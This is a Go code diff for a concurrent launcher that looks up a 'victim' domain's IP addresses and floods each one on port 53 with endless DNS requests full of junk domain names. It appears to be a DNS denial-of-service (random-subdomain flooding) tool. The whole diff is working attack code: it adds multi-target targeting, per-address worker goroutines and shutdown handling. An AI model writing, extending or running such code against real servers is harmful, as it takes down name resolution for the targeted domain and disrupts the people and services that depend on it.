@@ -1,9 +1,13 @@
 package internal
 
 import (
+	"fmt"
 	"log"
-	"runtime"
+	"net"
+	"os"
+	"os/signal"
 	"sync"
+	"syscall"
 	"time"
 )
 
@@ -11,17 +15,18 @@ type Launcher struct {
 	nRoutines    int
 	nQuestions   int
 	hostPort     string
+	ipAddresses  []net.IP
 	victimDomain string
 	sleepTime    *time.Duration
 	stop         chan struct{}
 	wg           sync.WaitGroup
 }
 
-func NewLauncher(nRoutines, nQuestions int, hostPort, victimDomain string, sleep *time.Duration) Launcher {
+func NewLauncher(nRoutines, nQuestions int, victimDomain string, sleep *time.Duration) Launcher {
 	return Launcher{
 		nRoutines:    nRoutines,
 		nQuestions:   nQuestions,
-		hostPort:     hostPort,
+		ipAddresses:  make([]net.IP, 0),
 		victimDomain: victimDomain,
 		sleepTime:    sleep,
 		stop:         make(chan struct{}),
@@ -29,18 +34,27 @@ func NewLauncher(nRoutines, nQuestions int, hostPort, victimDomain string, sleep
 }
 
 func (l *Launcher) Start() {
-	if l.nRoutines == 0 {
-		l.nRoutines = runtime.NumCPU()
-	}
-	for i := 0; i < l.nRoutines; i++ {
-		l.wg.Add(1)
-		go l.runner()
+	for _, ipAddress := range l.ipAddresses {
+		for i := 0; i < l.nRoutines; i++ {
+			l.wg.Add(1)
+			go l.runner(ipAddress.String())
+		}
 	}
 }
 
-func (l *Launcher) runner() {
+func (l *Launcher) Initialize() {
+	var err error
+	l.ipAddresses, err = net.LookupIP(l.victimDomain)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "could not get IPs: %v\n", err)
+		os.Exit(1)
+	}
+}
+
+func (l *Launcher) runner(ipString string) {
+	fullAddress := fmt.Sprintf("%s:53", ipString)
 	for {
-		rtt, dnsErr, err := NewDNSClient(l.hostPort).SendJunkDomainsRequest(l.nQuestions, l.victimDomain)
+		rtt, dnsErr, err := NewDNSClient(fullAddress).SendJunkDomainsRequest(l.nQuestions, l.victimDomain)
 		errorMessage := "none"
 		if err != nil {
 			errorMessage = err.Error()
@@ -61,6 +75,18 @@ func (l *Launcher) runner() {
 		default:
 		}
 	}
+}
+
+func (l *Launcher) AwaitShutdown() {
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(
+		sigChan,
+		syscall.SIGHUP,
+		syscall.SIGINT,
+		syscall.SIGTERM,
+		syscall.SIGQUIT,
+	)
+	<-sigChan
 }
 
 func (l *Launcher) Stop() {
